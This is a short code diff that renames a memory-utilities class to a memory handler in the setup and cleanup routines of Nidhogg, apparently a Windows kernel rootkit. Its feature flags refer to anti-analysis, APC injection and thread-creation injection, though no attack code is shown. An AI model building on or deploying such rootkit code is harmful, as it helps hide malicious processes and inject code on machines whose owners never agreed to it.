@@ -220,7 +220,7 @@ void ClearAll() {
 	delete NidhoggProcessHandler;
 	delete NidhoggThreadHandler;
 	delete NidhoggFileHandler;
-	delete NidhoggMemoryUtils;
+	delete NidhoggMemoryHandler;
 	delete NidhoggAntiAnalysis;
 	delete NidhoggRegistryHandler;
 	delete NidhoggNetworkUtils;
@@ -268,9 +268,9 @@ bool InitializeFeatures() {
 	if (!NidhoggFileHandler)
 		return false;
 
-	NidhoggMemoryUtils = new MemoryUtils();
+	NidhoggMemoryHandler = new MemoryHandler();
 
-	if (!NidhoggMemoryUtils)
+	if (!NidhoggMemoryHandler)
 		return false;
 
 	NidhoggAntiAnalysis = new AntiAnalysis();
@@ -312,7 +312,7 @@ bool InitializeFeatures() {
 		!reinterpret_cast<PULONG>(KeTestAlertThread) || !reinterpret_cast<PULONG>(ZwQuerySystemInformation))
 		Features.ApcInjection = false;
 
-	if (NidhoggMemoryUtils->FoundNtCreateThreadEx())
+	if (NidhoggMemoryHandler->FoundNtCreateThreadEx())
 		Features.CreateThreadInjection = true;
 	return true;
 }
